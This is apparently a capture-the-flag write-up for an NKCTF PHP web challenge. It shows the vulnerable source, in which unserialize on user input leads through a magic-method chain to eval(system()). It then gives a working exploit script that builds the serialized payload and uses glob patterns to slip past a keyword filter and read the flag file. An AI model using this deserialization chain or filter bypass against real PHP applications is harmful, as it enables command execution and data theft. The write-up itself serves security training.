```php
<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'oww!man!!';
        public function __construct(){
            $this->name = 'ItS SO CREAZY';
        }
        public function __destruct(){
            if($this->name == 'welcome_to_NKCTF'){
                echo $this->arg;
            }
        }
    }

    function waf($string){
        if(preg_match('/f|l|a|g|\*|\?/i', $string)){
            die("you are bad");
        }
    }
    class Happy{
        public $shell;
        public $cmd;
        public function __invoke(){
            $shell = $this->shell;
            $cmd = $this->cmd;
            waf($cmd);
            eval($shell($cmd));
        }
    }
    class Hell0{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }

    if(isset($_GET['p'])){
        unserialize($_GET['p']);
    }else{
        highlight_file(__FILE__);
    }
?>
```

从`Welcome`的`__destruct`出发，调用`Hell0`的`__toString`，再调用`Happy`的`__invoke`

尝试反弹shell没有成功，观察到通配符没ban干净，直接上通配符了

```php
<?php
class Welcome
{
    public $name;
    public $arg = 'oww!man!!';
}

class Happy
{
    public $shell;
    public $cmd;
}

class Hell0
{
    public $func;
}

$hello = new Hell0();
$hello->func = new Happy();
$hello->func->cmd = '/bin/c[^b-z]t /[^b][^b][^b][^b]';
$hello->func->shell = 'system';

$payload = new Welcome();
$payload->name = 'welcome_to_NKCTF';
$payload->arg = $hello;

echo serialize($payload);
```

#Web #PHP #serialization #shell #bypass